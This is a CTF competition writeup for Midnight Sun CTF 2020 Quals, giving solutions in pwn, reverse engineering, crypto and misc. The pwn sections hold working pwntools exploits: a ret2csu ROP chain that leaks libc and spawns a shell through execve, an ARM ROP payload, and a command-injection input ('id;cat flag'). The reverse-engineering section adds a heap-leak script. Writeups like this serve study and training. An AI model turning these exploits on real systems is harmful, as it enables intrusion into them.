title: "Midnight Sun CTF 2020 Quals Writeup"
tags:
  - CTF
  - Writeup
url: /archives/281/
#! meta end

just writeup...

#! head end

# pwn

## admpanel

Run `id;cat flag`.

## Pwny racing - pwn1

ret2csu. See https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop-zh/ (English: https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/ ) for more information.

```python
from pwn import *
from time import sleep

p=ELF('./pwn1')
main_addr=0x400698
main_end_addr=0x40070b
csu_end_addr=0x40077a
csu_front_addr=0x400760
fakeebp = b'b' * 8
bss_base = 0x602040 # not real bss_base, since stdin and stdout are at the real one

libc=ELF('./libc.so')

r=remote('pwn1-01.play.midnightsunctf.se',10001)

def csu(rbx, rbp, r12, r13, r14, r15, last):
	# pop rbx,rbp,r12,r13,r14,r15
	# rbx should be 0
	# rbp should be 1, disable jump
	# r12 should be the function we want to call
	# rdi=edi=r13 <- different from ctf-wiki
	# rsi=r14
	# rdx=r15
	payload = b'a' * 0x40 + fakeebp
	payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
	payload += p64(csu_front_addr)
	payload += b'a' * 0x38
	payload += p64(last)
	r.send(payload+b'\n')
	sleep(1)

r.recvuntil('buffer: ')
csu(0, 1, p.got['puts'], p.got['puts'], 0, 0, main_addr) # leak puts addr
puts_addr=int.from_bytes(r.recv(6),'little')
libc_addr=puts_addr-libc.symbols['puts']

r.recvuntil('buffer: ')
csu(0, 1, p.got['gets'], bss_base, 0, 0, main_addr)
r.send(b'/bin/sh\0\n')

r.recvuntil('buffer: ')
csu(0, 1, p.got['gets'], bss_base + 8, 0, 0, main_addr)
r.send(p64(libc_addr+libc.symbols['execve'])[:7]+b'\n') # gets will fill the last \0

r.recvuntil('buffer: ')
csu(0, 1, bss_base + 8, bss_base, 0, 0, main_addr)

r.interactive()
```

## Pwny racing - pwn3

ARM rop. I used ROPgadget to find gadgets. Note that libc is in thumb mode, so we need to add 1 to its address to switch to thumb mode.

```python
from pwn import *

r=remote('pwn3-01.play.midnightsunctf.se',10003)

exp=b'0'*4*35
exp+=p32(0x1fb5c)
exp+=p32(0x49018)
exp+=p32(0)
exp+=p32(0x14b5c+1) # switch to thumb

r.send(exp+b'\n')

r.interactive()
```

# forensics

## masterpiece

Get snes9x, find `Mario Paint (Japan, USA).sfc` from some websites.

I expected it to run, however, it stuck. I took a normal snapshot, and replace the header of given file. Then it successfully ran, and flag was shown.

# rev

## avr-rev

Main function is at sub_319. It reads a string, and decode it as some JSON-like data. Decode function is at sub_137. Then the decoded data is printed, along with a mystery number. This number seems calculated in sub_2D5.

For most objects, the number is 0. For `{xx:xx}`, the number is 1. For `{number:xx}`, the number is 2. For `{1337:string}`, the number is various.

In this case, the string is compared with flag, where flag is given in sub_884, in some strange way. When a character is different from flag, the result will be `(string[i]-flag[i])%256`. Thus we can find the flag byte by byte.

However, the string is at most 32 bytes, thus it only contains the first flag (for avr-rev).

### Bonus

After the CTF, we find the solution to avr-pwn. Send the following two strings, and they are connected into a big string. (`0123456789` is just a various padding)

```
{1:1,1337:"0123456789..."}
{1337:"...(32 bytes)"}
```

This is because the program malloc some new memory each time, and they are adjacent. Here's the script to find guess each byte.

```python
from pwn import *

r=remote('avr-01.play.midnightsunctf.se',1337)

def getnxt(s):
	t=s[:32]
	s=s[32:]
	v=[]
	while len(s):
		v.append(s[:22])
		s=s[22:]
	CHR='*'
	if len(v[-1])==22:
		v.append(CHR)
	else:
		v[-1]+=CHR
	for i in range(len(v)-1,-1,-1):
		r.recvuntil('\n')
		r.send('{'+'1:1,'*(i+1)+'1:"'+' '*10+v[i]+'"}\n')
		r.recvuntil('"}')
		r.recvuntil('\n')
	r.recvuntil('\n')
	r.send('{1337:"'+t+'"}\n')
	r.recvuntil('"}')
	r.recvuntil('\n')
	res=r.recvuntil('\n')
	return chr((ord(CHR)-int(res))%256)

cur='''First: midnight{only31?} But to get the second flag y'''
print(len(cur))
while True:
	cur+=getnxt(cur)
	print(cur)
```

# crypto

## pyBonHash

First use uncompyle6 to decompile the file.

Since each `bytes([data1, data2])` and `bytes([key1, key2])` only have 65536 options, we can enumerate all of them, and match with each other.

```python
import binascii,hashlib
from Crypto.Cipher import AES

s=open('hash.txt').read().strip()
s=binascii.unhexlify(s.encode())
n=len(s)//32
kl=42
key=[-1]*kl

fr={}

for i in range(256):
	for j in range(256):
		tohash = bytes([i,j])
		fr[hashlib.md5(tohash).hexdigest().encode()]=(i,j)

FIBOFFSET = 4919
MAXFIBSIZE = 500 + FIBOFFSET

def fibseq(n):
	out = [0, 1]
	for i in range(2, n):
		out += [out[(i - 1)] + out[(i - 2)]]
	return out
FIB = fibseq(MAXFIBSIZE)

def setkey(x,y):
	if key[x]==-1:
		key[x]=y
	assert key[x]==y

for i in range(n):
	t=s[i*32:i*32+32]
	for k1 in range(256):
		for k2 in range(256):
			thiskey = bytes([k1, k2]) * 16
			cipher = AES.new(thiskey, AES.MODE_ECB)
			v = cipher.decrypt(t)
			if v in fr:
				x,y=fr[v]
				setkey(((i*2 + FIB[(FIBOFFSET + i*2)]) % kl),k1)
				setkey(((i*2+1 + FIB[(FIBOFFSET + i*2+1)]) % kl),k2)
print(bytes(key))
```

## Verifier

Just use option 1 to sign `please_give_me_the_flag`.

## rsa_yay

In this task, we need to factorize `n`, while `hex(p)=hex(q)[::-1]`.

Suppose we know lowest k bits of p, we can find lowest k bits of q. Here we can also find highest k bits of p and q. Let them be $ph$ and $qh$. We know that $ph\cdot qh\cdot 2^{1024-2k}\le n<(ph+1)\cdot(qh+1)\cdot 2^{1024-2k}$, thus we may check whether $ph$ and $qh$ are (possibly) correct.

```python
from gmpy2 import *
import binascii

n=0x7ef80c5df74e6fecf7031e1f00fbbb74c16dfebe9f6ecd29091d51cac41e30465777f5e3f1f291ea82256a72276db682b539e463a6d9111cf6e2f61e50a9280ca506a0803d2a911914a385ac6079b7c6ec58d6c19248c894e67faddf96a8b88b365f16e7cc4bc6e2b4389fa7555706ab4119199ec20e9928f75393c5dc386c65
cipher=0x3ea5b2827eaabaec8e6e1d62c6bb3338f537e36d5fd94e5258577e3a729e071aa745195c9c3e88cb8b46d29614cb83414ac7bf59574e55c280276ba1645fdcabb7839cdac4d352c5d2637d3a46b5ee3c0dec7d0402404aa13525719292f65a451452328ccbd8a0b3412ab738191c1f3118206b36692b980abe092486edc38488

def reverse_hex(x,n):
	y=0
	for i in range(n):
		y=y*16+x%16
		x//=16
	return y

cur=[]

# Find all cases for lowest 12 bits
for i in range(1,4096,2): # i is lowest 12 bits of p
	t=invert(i,4096)*(n%4096)%4096 # t is lowest 12 bits of q
	assert t*i%4096==n%4096
	t2=reverse_hex(t,3) # t2 is highest 12 bits of q
	i2=reverse_hex(i,3) # i2 is highest 12 bits of p
	l=i2*t2<<(4*125*2)
	r=(i2+1)*(t2+1)<<(4*125*2)
	if l<=n<=r: # check where n is in the range
		cur.append(i)

# Current digit (in hex)
for c in range(4,65):
	nc=[]
	mod=16**c
	for x in cur:
		for y in range(16):
			i=x+y*16**(c-1) # i is lowest 4c bits of p
			t=invert(i,mod)*(n%mod)%mod # t is lowest 4c bits of q
			assert t*i%mod==n%mod
			t2=reverse_hex(t,c) # t2 is highest 4c bits of q
			i2=reverse_hex(i,c) # i2 is highest 4c bits of p
			l=i2*t2<<(4*(128-c)*2)
			r=(i2+1)*(t2+1)<<(4*(128-c)*2)
			if l<=n<=r: # check where n is in the range
				nc.append(i)
	cur=nc

# Find real solution
c=64
mod=16**c
for i in cur:
	t=invert(i,mod)*(n%mod)%mod
	assert t*i%mod==n%mod
	t2=reverse_hex(t,c)
	i2=reverse_hex(i,c)
	p=t2<<256|i
	q=i2<<256|t
	if p*q==n:
		break

e=65537
d=invert(e,(p-1)*(q-1))
o=pow(cipher,d,p*q)
print(binascii.unhexlify(hex(o)[2:]))
```

# guessing

## indian guess

The server guesses my number by binary search. Input `nan` and then it fails.

# misc

## sanity

Just enter irc.

## Snake++

Consider the following strategy:

```
v<<<<<
v>v>v^
v^v^v^
v^v^v^
>^>^>^
```

Walk on the circle, and shoot if `B` exists. To check if `B` exists, we may just enumerate all locations, and check if `B` is there.

The follwing python code generates required snake++ code.

```python
def getsol(x1,y1,x2,y2,a,b):
	return ' '

r=''

r+='red:=100;\n'
for x in range(1,29):
	for y in range(1,19):
		r+='banana ~<8=== %d %d;\nif banana=="B" then\n\tred:=%d;\n\tgreen:=%d;\nfi;\n'%(x,y,x,y)

def addroute(x,y,v):
	global r
	x+=1;y+=1
	r+='if blue==%d then\n\tif yellow==%d then\n\t\treturn "%s";\n\tfi;\nfi;\n'%(x,y,v)

addroute(1,0,'L')
addroute(27,1,'L')
for i in range(0,28,2):
	addroute(i,16,'L')
	addroute(i,17,'L')
for i in range(1,27,2):
	addroute(i,1,'R')
	addroute(i,2,'R')

r+='''
if red<100 then
	return " ";
fi;
'''

r+='return "";\n'
r+='.\n'
open('test.txt','w').write(r)
```

The following one interacts with the server.

```python
from pwn import *
from base64 import b64decode

context.log_level = 'debug'

r=remote('snakeplusplus-01.play.midnightsunctf.se',55555)

r.recvuntil('Your choice: ')
r.send('2\n')
r.recvuntil('--- Press enter to continue ---')
r.send('\n')
r.recvuntil('--- Press enter to continue ---')
r.send('\n')
r.recvuntil('Enter your program code, and end with a . on a line by itself')

r.send(open('test.txt').read().strip()+'\n')

r.recvuntil('--- Press enter to start ---')
r.send('\n')
r.recvuntil('Result: ')
open('t.zip','wb').write(b64decode(r.recvuntil('\n').strip()))

```
